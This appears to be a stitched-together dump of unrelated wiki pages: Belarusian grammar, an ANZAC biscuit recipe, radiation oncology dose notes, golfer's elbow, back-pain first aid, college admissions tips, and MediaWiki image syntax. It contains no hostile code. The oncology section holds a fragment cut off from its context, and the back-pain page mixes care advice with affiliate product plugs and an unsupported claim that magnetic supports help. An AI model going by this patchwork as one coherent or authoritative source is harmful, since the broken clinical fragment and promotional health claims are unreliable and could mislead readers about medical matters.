The indefinite words correspond to the English ''some'' and its derivarives (''somebody'', ''something'', ''somehow'' etc.) Actually each question word has a correspondent indefinite word, and most of them even two or three. One is formed via ''не'' prefix, and another - with ''сцi'' (or ''сь'') suffix.

{| class=&quot;wikitable&quot;
|-
! Question Word
| хто
| што
| які (яко́е, яка́я, якія)
| чый (чыё, чыя́, чые́)
| ко́лькі
| як
|-
! &quot;не&quot;-words
| не́хта
| не́шта
| не́йкі (не́йкае, не́йкая, не́йкія)
| -
| не́калькі
| не́як
|-
! &quot;сьці&quot;-words
| хто́сьці
| што́сьці
| якісьці (not used in other flexions)
| чы́йсьці (чыёсьці, чыя́сьці, чые́сьці)
| -
| -
|-
! &quot;сь&quot;-words
| хтось
| штось
| якісь (not used in other flexions)
| no form for masculine (чыёсь, чыя́сь, чые́сь)
| -
| -
|}

The &quot;сь&quot;-forms are only used in colloquial speech, while the other two are interchangeable.

'''Што гэ́та? Не́шта (Што́сьці) прыго́жае.''' What is this? It's something beautiful.

'''Хто гэ́та? - Гэ́та не́йкі звер. - Воўк? - Не, не воўк. Не́хта яшчэ́.''' Who is that? - It's a kind of a beast. - A wolf? - No, not a wolf. Somebody else.

'''Гэ́та твая́ ідэ́я? Не, не мая́. Чыя́сь яшчэ́.''' Is that your idea? No, not mine. It's someone else's.

'''Там саба́ка і не́калькі ка́чак.''' There is a dog and some ducks there.

'''Ты ху́тка пла́ваеш? Не, не ду́жа ху́тка, але́ не́як пла́ваю.''' Do you swim fast? No, not very fast, but I swim in some way.

Note that the words ''колькі'' and ''некалькі'' require the Genitive Case.

Also note that the words ''нехта'' and ''хтосьці'' are masculine whereas ''нешта'' and ''штосьці'' are neuter.

The Genitive forms of the indefinite words are the same as the Genitive forms of the correspondent question words.

'''Чыя́ гэ́та кніга? - Гэ́та кніга не́йкага студэ́нта.''' &quot;Whose book is this? This is a book of some student&quot;.

'''Ён а́ўтар не́калькіх ка́зак.''' He is an author of several tales.

'''Гэ́та пача́так чаго́сьці ціка́вага.''' This is a beginning of something interesting.

&lt;big&gt;&lt;u&gt;'''The original ANZAC biscuit recipe'''&lt;/u&gt;&lt;/big&gt;

[[Ingredients]]

1 cup plain flour 

1 cup rolled oats (regular oatmeal) uncooked 

1 cup desiccated coconut
 
1 cup brown sugar
 
1/2 cup butter 

2 tbsp golden syrup
 
1 tsp bicarbonate of soda
 
2 tbsp boiling water
 
[[Method]]

Combine the flour (sifted), oats, coconut and sugar in a bowl.
 
Melt the butter and Golden Syrup in a saucepan over a low heat. 

Mix the bicarbonate of soda with the water and add to the butter and Golden Syrup. 

Pour the liquids into the dry ingredients and mix well. 

Spoon dollops of mixture, about the size of a walnut shell, onto a greased tin leaving as much space again between dollops to allow for spreading. 

Bake in a moderate oven, 180C / 350F, for 15-20 minutes. 

Cool on a wire rack and seal in airtight containers. 

[[Tips]]

The American tablespoon is a little smaller than the British/Australian tablespoon, so be generous with your Golden Syrup and Water. 

And never, ever call them ANZAC ''cookies'' - please retain their original and historic name.</text>

      <text xml:space="preserve">I am not quite happy with the enthusiastic introduction.  Two flaws apparently come to mind: First, it is not at all obvious that math is a Universal Language across species.  In fact, we have overwhelming evidence that we can not use math to communicate with other living entities like plants or animals.  We can efficiently communicate with our pets, but not through use of mathematics, but by other means such as body language, etc.

Second, much is not known about the development of mathematics, and how it relates to language.  That there is a strong connection between language (syntax) and our mathematical abilities seems clear.  But the particulars of this connection, and its historic development is pretty much unknown.  It seems to me the article should be toned down a lot(!) and give appropriate references for curious readers.  17:10, 25 June 2007 (UTC)



By the account of &quot;Where did Mathematics come from?&quot;, my dog does mathematics!  12 Sept 2007 RJM

Yes, I am in agreement with the poster above. [[Special:Contributions/216.221.91.101|216.221.91.101]] ([[User talk:216.221.91.101|talk]]) 01:07, 6 March 2008 (UTC)


I am exceedingly unhappy with the introduction.  The author point blank states the constructionist hypothesis, with no reference to the platonic or intuitionist schools.  Although neoplatonism is objectionable to many humanists due to a mistaken belief that it is a form of Theism, there are many mathematicians who believe that mathematics exists outside the human context, and that there is a form of &quot;abstract reality&quot; within which mathematics exists.  Otherwise we are asked to believe that the 1+0=1 is only true in human context, which in turn raises the question as to whether the universe would exist were there no humans to observe it.

I don't believe that a discussion of the nature of the existence of maths belongs in a &quot;Beginning Mathematics&quot; book. [[Special:Contributions/121.222.243.151|121.222.243.151]] ([[User talk:121.222.243.151|talk]]) 21:34, 16 December 2008 (UTC)</text>

==Ocular Neuropathy==
===Single Fraction===
*Optic nerve &amp; chiasm MTD: conservatively 10 Gy, point dose 12 Gy. No DVH data available
*Majority &lt;2 years, but can develop 3+ years later


*'''Mayo, 2003''' PMID 12654424 -- &quot;A study on the radiation tolerance of the optic nerves and chiasm after stereotactic radiosurgery.&quot; (Stafford SL, Int J Radiat Oncol Biol Phys. 2003 Apr 1;55(5):1177-81.)
**Retrospective. 218 gamma knife plans (122 sellar/parasellar, 89 pituitary, 7 cranipharyngiomas). Prior RT in 11% patients. Median F/U 40 months
**RT: median max 10 Gy (0.4-16.0)
**Radiation optic neuropathy: 4 patients (2%) at median 48 months. All had prior surgery, 3/4 prior EBRT (risk 0.5% vs. 13%). 
**Conclusion: Risk of RON 1% if &quot;short&quot; segment dose &lt;=12 Gy. &quot;Long&quot; segment to 9 Gy may carry a significant risk. Short vs. long not enough data to define

*'''Maryland, 2000''' PMID 11180138 -- &quot;Preservation of visual fields after peri-sellar gamma-knife radiosurgery.&quot; (Ove R, Int J Cancer. 2000 Dec 20;90(6):343-50.)
**Retrospective. 20 patients, 90% pituitary adenomas. Median F/U 24 months
**RT: mean max dose 9 Gy (2.5-14.1), volume average of optic chiasm 5.2 Gy.
**Complications: none
**Conclusion: 8 Gy conservative, 10 Gy justifiable

*'''Graz, 1998''' (Austria) PMID 9420071 -- &quot;Dose-response tolerance of the visual pathways and cranial nerves of the cavernous sinus to stereotactic radiosurgery.&quot; (Leber KA, J Neurosurg. 1998 Jan;88(1):43-50.)
**Retrospective. 50 patients with gamma knife treatment of middle cranial fossa. Mean F/U 40 months
**Optic neuropathy: 0% if &lt;10 Gy, 27% if 10-15 Gy, 78% if &gt;15 Gy
**Other CN neuropathy: none, doses 5-30 Gy
**Conclusion: 10 Gy MTD
**Critique: same imprecise technique as used in Pittsburgh/MGH study below

*'''Pittsburgh/MGH, 1993''' PMID 8407394 -- &quot;Tolerance of cranial nerves of the cavernous sinus to radiosurgery.&quot; (Tishler RB, Int J Radiat Oncol Biol Phys. 1993 Sep 30;27(2):215-21.)
**Retrospective. 62 patients with lesions around cavernous sinus. Treated with GKS (33 patients) or 6MV linac (29 patients). Median F/U 19 months
**Optic complications: 4 patients, dose response seen (4/17 dose &gt;8 Gy; 0/35 dose &lt;8 Gy)
**Conclusion: Dose to optic apparatus should be &lt;8 Gy
**Critique PMID 12654424: 1) planning done on CT, where it is hard to visualize optics, 2) max dose determined by manually overlaying computer isodose printouts over CT images, and with steep dose falloff, 8 and 10 Gy isodoses are only several mm apart =&gt; possible measurement error

All moderate/severe complications when max dose &gt; 60Gy. Severe complications NTCP 81%, 80% and 23%; moderate complications NTCP 15%; mild complications NTCP 5% and 1% using Emami data. Additional 13 nerves had NTCP 19%-83% without complication. Overall good fit to model using n=0.25, m=0.14 TD50=72 Gy (increased from original 65 Gy)
**&lt;u&gt;Retina&lt;/u&gt;: 1 mild complication (mean 63.3 Gy, max 76.1 Gy), no complication 39 retinas (mean avg 29.8 Gy, mean max 64 Gy, max avg 51.4 Gy, max max 77 Gy). NTCP 56%, model using n=0.2, m=0.19, TD50=65 Gy)

==Ocular neuromyotonia==
*Rare disorder
*Clinical characteristics:
**Intermittent diplopia lasting seconds to minutes
**Paroxysm may last up to several minutes, and occur multiple times per day
**Amount and pattern of eye deviation (leading to diplopia) may vary without any pattern
*Physical examination
**CN exam typically normal
**Can be provoked by having patient hold excentric gaze, and then by changing gaze direction (see [http://bjo.bmj.com/content/vol88/issue12/images/data/DC1/Ospina_final.mov Abnormal gaze movie] at BMJ.com)
*Pathogenesis:
**Presumed radiation-induced cranial neuropathy due to segmental demyelination, manifesting as spontaneous discharge from axons with unstable cell membranes
**This leads to involuntary tonic contraction of one or more ocular muscles innervated by CN III, CN IV and CN IV
**Subsequently, patients develop a paroxysmal binocular misalignment 
*May be radiation-induced
**Intracranial masses (typically near skull base); [[Radiation_Oncology/Medulloblastoma|medulloblastoma]]; pituitary tumors
**[[Radiation_Oncology/Head_%26_Neck/Nasal_cavity|Nasopharyngeal CA]]
**[[Radiation_Oncology/Palliation/Brain_Metastases#WBRT_alone|Whole brain RT]]
*Treatment: 
**Prism glasses
**Neurontin or Tegretol

Medial epicondylitis is sometimes known as golfer's elbow.

Golfers Elbow is a problem with the flexor muscle mechanism of the wrist - in other words the group of muscles whose job it is to flex the wrist joint. These muscles are attached to the facet on the anterior aspect of the medial epicondyle at the elbow.

Golfers elbow or medial epicondylitis is much less common than tennis elbow or lateral epicondylitis. 

'''Features of Medial Epicondylitis'''
* Pain at the medial epicondyle or inner side of the joint 
* A history of overuse 
* Expect to find normal range of movement on passive testing of the joint 

The main &quot;golfers&quot; sign is pain on resisted flexion of the wrist - more so if tested with the elbow held in the extended position during testing.

The site of inflammation is almost invariably at the teno-osseous junction where the common flexor tendon meets the medial epicondyle at its anterior aspect. The teno-osseous junction is the part where the tendon tissue joins with the bone.

The pain may be felt by the patient further down the arm in the muscle belly of the flexors in the forearm - this pattern of referred pain can sometimes cause confusion. 


'''Treatment of golfers elbow'''
There are three main options for golfers elbow treatment - but keep in mind that the natural history is for spontaneous resolution in the majority of cases

* '''Conservative''' - Avoid provoking activity or change sports equipment (grip size of tennis racket or golf clubs). Short term anti-inflammatory medication and reassure strongly. Consider using an epicondylar clasp for symptom relief. 
* '''Physiotherapy''' - reasonable success rate although may require several treatments before substantial improvement is seen. Treatment needs to be backed up by education on stretching and prevention of recurrence. 
* '''Injection of steroid and local anaesthetic''' - the most cost effective option. No difference from physiotherapy in long term outcome but works more quickly and is much more cost effective.

      <text xml:space="preserve">'''First Aid Treatment for Lower Back Pain'''


'''First aid for back pain - treating yourself''' 

For most people, most of the time, lower back pain is easily defeated when it strikes. Here are “Cameron's Rules” for winning the battle with low back pain. They apply to the most common type of low back attack which is pain mainly in the back with some pain in the buttock or thigh. Nerve irritation - shooting pain down the leg as far as the ankle - needs a slightly different plan of campaign. 


* '''Rule One - DON'T PANIC!''' 
Remember that most people who suffer from an attack of lower back pain will improve within a week or so - although it can take up to a month to go away completely. Avoid getting into a negative state of mind at the outset and the battle is half won. 


* '''Rule Two - Give your back a chance'''
All attacks of low back pain benefit from an initial short period of rest to allow them the best chance of recovery. It's important to spend as little time as possible in bed as the muscles and bones of the spine will begin to lose some of their natural strength. Forty eight hours is the maximum you should allow yourself and if you can get up sooner then so much the better. 
Some will find lying on their back most comfortable, others will prefer lying on their side with knees curled up and a pillow between the legs. Try to lie on a firm high bed if possible. Getting up off the floor can be very difficult and rolling like a log out of a high bed is much easier. Keep things like a flask of tea or coffee by the bedside so that you can minimise the time you spend up and about. When you are on your feet then encourage circulation of blood around your spine by gentle back and forward movements. 


* '''Rule Three - Try to ease the spasm ''' 
Even though a facet joint or a lumbar disc is probably triggering the pain, it is often muscle spasm which keeps the lower back pain going. If you can begin to release this spasm then things will settle more quickly. Some prefer ice, others like heat - I find a combination of the two works well. 
Use a hot water bottle wrapped in a towel to apply heat for up to twenty minutes. Gently mobilise the spine afterwards by encouraging slow, small back and forward movements and then apply ice. Frozen peas make a better ice pack than ice cubes because the latter melt into a puddle within five or ten minutes. The peas can be re-frozen ready for use again later. Do mark the bag with a pen though - otherwise they may end up accompanying your fish and chips at a later date! 

Should you try a back support? 

I'm often asked this question by patients and to be truthful it's never easy to be dogmatic about the answer. Many patients with acute back spasms seem to benefit from wearing some kind of support strapping (strapping with magnets in the support seems particularly helpful). But I've yet to find a foolproof way to predict which back pain patients will benefit. These devices are fairly inexpensive however so my advice usually is &quot;try it and see.&quot;
A good example of this kind of Magnetic Back Support is available from Amazon.com - click on the blue words above to check it out. 


 

* '''Rule Four - Medication often helps'''
I know many of you worry about using pain killers or muscle relaxing tablets in case you become addicted. True, this can be a problem if the medication is taken continuously over a period of months but will not happen with short term use. Try simple paracetamol (tylenol) or aspirin - despite glossy adverts from drug companies there is no evidence that any other drugs are better. If this is not helping in twenty four hours then your doctor should be able to prescribe something a bit stronger. 

Take your pain killing medication regularly - every six hours is a good idea. Don't wait for the pain to get bad before you reach for the tablets - this is a classic mistake. It is much easier to stop a pain from coming than it is to get rid of it once it arrives. Don't be a “brave soldier” - you'll get better much quicker if you can break out of the pain cycle. 


* '''Rule Five - Get the circulation going again'''
After an initial time of rest you must get blood flowing around the spine again. The heat and ice described above will help but nothing beats gentle movement - discs depend on it to keep them nourished. When pain strikes then the sooner normal mobility returns the better. The fluid which feeds discs is squeezed in and out as the bones move. 

If possible, get someone to gently massage the tight muscles of the spine. Then, still lying in bed, begin to move. Lie on your side and to start by curling up the legs towards your tummy. Go as far as you can without causing a lot of pain. Gently unwind again and then go in the opposite direction by slowly arching your back. Again, stop short of causing pain and try to repeat this process six times every hour if you can. You should notice benefit quite quickly. Keep this type of spinal movement going for several days once you are back on your feet again. Even a pain free spine will enjoy this as a warm up routine first thing every morning and a cool down last thing at night. Get into this habit and you may prevent further problems. 

If you find it difficult to arrange a lower back massage or if you experience repeated attacks of this type of low back pain then you might want to consider investing in a Shiatsu Massaging Low Back Cushion - I was lucky enough to have one on trial during a recent bout of my own low back pain. What can I say - wonderful, bliss, fantastic - it would be easy to run out of adjectives. Take a look at this type of product on Amazon by following the link above. 


* '''Rule Six - look at your lifestyle'''
Smoking at any time is bad for your back. I know doctors always say that but it's true. The chemicals in the smoke lessen the bodies ability to repair damage and make attacks of back pain more common and longer lasting. Smoking during an acute attack is crazy. 

Small amounts of alcohol can ease pain and spasm but avoid the temptation to use it as a pain killer. We all know the morning after feeling of thirst that a boozy session can produce. An inflamed disc needs as much water as it can get to speed recovery but alcohol causes fluid loss from the body. Drinking more than a glass or two of wine in a day will slow down the recovery process. 

If you are stuck in bed for a day or two then take the opportunity to reassess your overall lifestyle. Are you overweight. Do you really get as much exercise as you should. Make a few resolutions as you lie there and turn the negative experience of back pain into one with a positive long term outcome. 

And on the subject of bed - if you are prone to recurrent spells of back ache then you should be taking a close look at your either your bed or your mattress or both. Too firm, too soft? The eternal dilemma for the back pain sufferer. Before spending a fortune on a new bed, take a look at this Foam Memory Mattress from Amazon.com. I know about a dozen patients of mine who have tried it recently with good results. No promises of course but it might be worth a try before spending a fortune on an entire new bed. 


* '''Rule Seven - seek help from an expert'''
Following the simple guidelines above will see most of you well on the way to recovery within two or three days. If you are not getting better by that stage then seek the help of someone trained in “hands on” manual therapy for your back. This could be an osteopath, a chiropractor or a physiotherapist depending on local availability or your preference.

==Should You Go?==
According to [http://www.studentsreview.com studentsreview], 81% of students would choose to return to RC, whereas 19% would not. However, it's not for everyone. Those who don't plan on going to graduate school will find that many employers have never heard of Reed. People who are uncomfortable in tiny classes (often around one dozen) with much discussion may want to look at [[:Category:Universities]] instead. &quot;Reedies&quot; are hard workers, and in such a small college, you can't get away with slacking off. Since there are no fraternities or sororities, the party scene is not very prevalent. However, illicit drugs are relatively common. Lastly, conservatives probably will not fit in.

      <text xml:space="preserve">Early Decision (ED), as the name suggests, is an alternate way of applying to college that occurs earlier than normal. This kind of application is '''binding''', meaning that if you are accepted, you must drop all applications to other colleges. As a result, you can only apply for ED at one college.

The advantage of ED is that it shows a commitment and special interest in the college. This results in a higher acceptance rate.

      <text xml:space="preserve">Early Action (EA) is an application option given at some colleges that allows the student to apply earlier than usual. This results in an earlier reply from the college. Unlike Early Decision (ED), EA is '''non-binding''', meaning you are free to go to other colleges even if you are accepted.

      <text xml:space="preserve">Volunteering has a number of benefits. Besides showing colleges that you care for your community, it is a good way to make friends, gain experience, and feel good.

There are countless ways to volunteer. A good place to start is Google or your municipal government. Even editing wikibooks is considered volunteering.

      <text xml:space="preserve">Your choice of a college will probably be the most important decision you will ever make before becoming an adult. With literally thousands of choices, it is necessary to narrow down the possibilities.

==I. Narrowing it Down==

===1. How Competitive?===
You should separate your college possibilities in three. The first is your &quot;reach schools&quot;, one or two schools that you have a low chance of getting in, but would really like to go to. The next group is your &quot;target schools&quot;, two to four that you have a pretty good chance of getting in to. The last one or two are the &quot;safety schools&quot;, those that you don't really want to go to but would if you had no other choice.

Of course, competitiveness does not ensure a fit. Which is why this list does not end at #1.

===2. Public or Private?===
Public colleges are usually less expensive, especially if you are a resident of that state. However, diversity may be low, and the best of the best colleges are usually private (with the exception of the UC system).

===3a. University or Liberal Arts?===
Universities generally have more choices than liberal arts colleges. However, they may feel crowded, and have a high student-teacher ratio. Universities are more likely to give athletic scholarships, and are more likely to have fraternities/sororities. Universities usually have better research facilities, but liberal arts classes are more likely to be taught by a professor and not a TA.

===3b. Big or Small?===
Universities are generally larger than liberal arts colleges. Bigger means more choice, but it can make you feel lost.

===4. Close or Far?===
If you go home every winter, spring, and summer break, travel costs can add up if the college is far from home. On the other hand, if you want your parents off your back, or don't like the weather of your hometown, you may want to go to a college that is further from home.

==II. In-Depth==
Once you've narrowed down the choices to less than a dozen, it's time to look more deeply into each college. This would be a good time to look for [http://facebook.com facebook] groups with students from the colleges you are looking at. Get to know the kind of people that go, and what they see as the strengths and weaknesses of the college.

There are many guides in bookstores and libraries about colleges. Most have one to five pages per college. However, this may not be enough for you. You can literally buy a 150 page book about a specific college from collegeprowler, get a subscription at their [https://www.collegeprowler.com/register/student-registration.aspx website]. Amazon sells the individual books for about $10.

Of course, the best thing to do if possible is to actually visit the campus. Most college websites will tell you in their admission section about how to register for a visit. Nothing comes close to this in helping you decide.

      <text xml:space="preserve">==GPA==
Your GPA is the most important factor that colleges use to accept or not accept students. To get into a competitive college, it's important to get high grades ''and'' take challenging courses. This usually means AP, IB, or honors level courses.

There are two common ways of calculating GPA in the US - the &quot;4.0&quot; scale and the &quot;100&quot; scale. The former, which is more common, uses the grade of A as 4.00, A- as 3.67, B+ as 3.33, B as 3.00, B- as 2.67, and so on. Depending on the school, honors, AP, IB, and accelerated classes may be &quot;weighted&quot; to increase the GPA of those who take harder courses.

The latter system is less common, but easier to calculate. Instead of using letter grades, it directly takes into account the numerical value of your grade out of 100.

Your guidance counselor should be able to tell you your GPA.

      <text xml:space="preserve">A student's personality is decisive in showing colleges that he or she is more than just an encyclopedia. Colleges want people, not computers.

Different colleges will want different types of people. But in general, they want people who will bring prestige to the college through hard work and/or certain moral beliefs.

      <text xml:space="preserve">how about using ImageMagick to convert postscript to png/jpg? [[User:Fjornada]]
:yes, it works, it's just another way of doing it. Add your experience, then! [[User:Alejo2083|Alessio Damato]] 12:15, 27 June 2007 (UTC)

==HTML==
I've added a bit about HTML in the lead in hopes that someone whom is familiar with this could fill in a section on converting &lt;tt&gt;.tex&lt;/tt&gt; to HTML. I think there is more than one way to do it, but I don't use this feature of LaTeX, so I don't want to write it.

      <text xml:space="preserve">__TOC__

Images can be a vital addition to some books, illustrating a vital point or providing a visual aid to advance a readers understanding. Proper image formatting can dramatically alter a page's appearance.

From [[w:Wikipedia:Extended_image_syntax|Wikipedia's image syntax guide]], the general syntax for including an image is:

&lt;pre&gt;
[[File:{name}|{type}|{location}|{size}|{border}|{caption}]]
&lt;/pre&gt;

'''{name}''' is the name of the image file, E.g. Commons-logo.svg, either stored here on Wikibooks or on Wikimedia Commons. All images need to have a name specified. 

'''{type}''' is the type of formatting the image has. &quot;thumb&quot; makes the image a thumbnail and puts it in a box and resizes the image if it is larger than the thumbnail size value set in the user preferences under the Files tab. The default is 180px, and this is used for people without an account or who are not logged in. &quot;frame&quot; puts the image in a box and doesn't resize it. Not putting in a type will just put the image in without a box at it's original size, unless a size is given.

'''{location}''' is where the image will be put on the page. &quot;left&quot;, &quot;right&quot;, and &quot;center&quot; put the image on either the left or right side of the page, or in the center of the page, respectively, and wrap the text around the image. &quot;none&quot; puts the image under the text and puts following text underneath it. If you don't put in a location the image is included inline with the text.

'''{size}''' is the width of the image in pixels, written as the number of pixels followed by px, E.g. 200px for 200 pixels width. The image will be scaled to maintain aspect ratio to fit into this size. Images can be scaled up or down. If not used then image is shown at full size, or if it is a thumbnail, then the maximum size of a thumbnail. With thumbnails the size option won't work if you try to make the image larger, even if it is still below the limit for images being resized in thumbnails (180px by default), and the image will remain it's normal size in the thumbnail if you try. But you can still make the picture smaller if you want by using a size less than the images original width and less than the thumbnail size.

'''{border}''' just gives the image a gray line border, by using &quot;border&quot; as one of the options. Not giving a border will leave the image without a border, unless it already has one from the type.

'''{caption}''' is the alternate text of the image that you see when you hold the mouse over it. It is also used as the caption text for images using &quot;thumb&quot; or &quot;frame&quot;. Wikiformatting can be used in this, E.g. links, but the formatting is removed for the alternate text and only shown in captions. If no caption is given, the filename is used as alternate text, and the caption on a frame or thumb is left blank.

The order of the options shouldn't matter except for the name part. Using thumb and frame at the same time will just default to frame. Using multiple locations in the image will make the image use whatever location was given last. Same thing with multiple sizes.

==Inserting an Image==
A plain, unformatted picture can be inserted into a page by typing &lt;nowiki&gt;[[File:&lt;/nowiki&gt;&lt;i&gt;ImageName&lt;/i&gt;&lt;nowiki&gt;]]&lt;/nowiki&gt;. 

This inserts the image into the page, however the image appears at full size on the page, and does not integrate correctly with text. This is demonstrated below.

Adding

&lt;pre&gt;
[[File:Vista-folder.png]]
&lt;/pre&gt;

to the middle of the text makes

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.
[[Image:Vista-folder.png]] Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus.&lt;/span&gt;&lt;/i&gt;

As you will agree, this does not look right. The text is poorly aligned with the image and the image is very large.

==Placing the Image==
By altering the image code slightly we can determine the positioning of the image on the page. There are several options available for us to choose on, depending on the desired layout of the page we are creating.

===Example One, Right Align, Wrapped Text===

&lt;pre&gt;
[[File:Vista-folder.png|right]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
[[File:Vista-folder.png|right]] &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;

&lt;span style=&quot;color:#996633&quot;&gt;Phasellus orci. Etiam tempor elit auctor magna. Nullam nibh velit, vestibulum ut, eleifend non, pulvinar eget, enim. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Integer velit mauris, convallis a, congue sed, placerat id, odio. Etiam venenatis tortor sed lectus. Nulla non orci. In egestas porttitor quam. Duis nec diam eget nibh mattis tempus. Curabitur accumsan pede id odio. Nunc vitae libero. Aenean condimentum diam et turpis. Vestibulum non risus.&lt;/span&gt;&lt;/i&gt;

Here we can see how the image has been placed on the right hand side of the page and the text wraps around it.

===Example Two, Right Align, With Caption, Wrapped Text===
&lt;pre&gt;
[[File:Vista-folder.png|frame|right|Caption goes here]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
&lt;/i&gt;[[File:Vista-folder.png|frame|right|Caption goes here]]&lt;i&gt; &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;

&lt;span style=&quot;color:#996633&quot;&gt;Phasellus orci. Etiam tempor elit auctor magna. Nullam nibh velit, vestibulum ut, eleifend non, pulvinar eget, enim. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Integer velit mauris, convallis a, congue sed, placerat id, odio. Etiam venenatis tortor sed lectus. Nulla non orci. In egestas porttitor quam. Duis nec diam eget nibh mattis tempus. Curabitur accumsan pede id odio. Nunc vitae libero. Aenean condimentum diam et turpis. Vestibulum non risus.&lt;/span&gt;&lt;/i&gt;

Here we can see how the image has been placed on the right hand side of the page with a caption underneath and the text wraps around it.

===Example Three, Left Align, Wrapped Text===
&lt;pre&gt;
[[File:Vista-folder.png|left]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
[[File:Vista-folder.png|left]] &lt;span style=&quot;color:#996633&quot;&gt;Mauris at ipsum vitae est lacinia tincidunt. Maecenas elit orci, gravida ut, molestie non, venenatis vel, lorem. Sed lacinia. Suspendisse potenti. Sed ultricies cursus lectus. In id magna sit amet nibh suscipit euismod. Integer enim. Donec sapien ante, accumsan ut, sodales commodo, auctor quis, lacus. Maecenas a elit lacinia urna posuere sodales. Curabitur pede pede, molestie id, blandit vitae, varius ac, purus. Morbi dictum. Vestibulum adipiscing pulvinar quam. In aliquam rhoncus sem. In mi erat, sodales eget, pretium interdum, malesuada ac, augue. Aliquam sollicitudin, massa ut vestibulum posuere, massa arcu elementum purus, eget vehicula lorem metus vel libero. Sed in dui id lectus commodo elementum. Etiam rhoncus tortor. Proin a lorem. Ut nec velit. Quisque varius. Proin nonummy justo dictum sapien tincidunt iaculis. Duis lobortis pellentesque risus. Aenean ut tortor imperdiet dolor scelerisque bibendum. Fusce metus nibh, adipiscing id, ullamcorper at, consequat a, nulla.&lt;/span&gt;&lt;/i&gt;

Here we can see how the image has been placed on the left hand side of the page and the text wraps around it.

===Example Four, Text Not Wrapped===
&lt;pre&gt;
[[File:Vista-folder.png|none]]
&lt;/pre&gt;

&lt;i&gt;&lt;span style=&quot;color:#996633&quot;&gt;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis tellus. Donec ante dolor, iaculis nec, gravida ac, cursus in, eros. Mauris vestibulum, felis et egestas ullamcorper, purus nibh vehicula sem, eu egestas ante nisl non justo. Fusce tincidunt, lorem nec dapibus consectetuer, leo orci mollis ipsum, eget suscipit eros purus in ante.&lt;/span&gt;
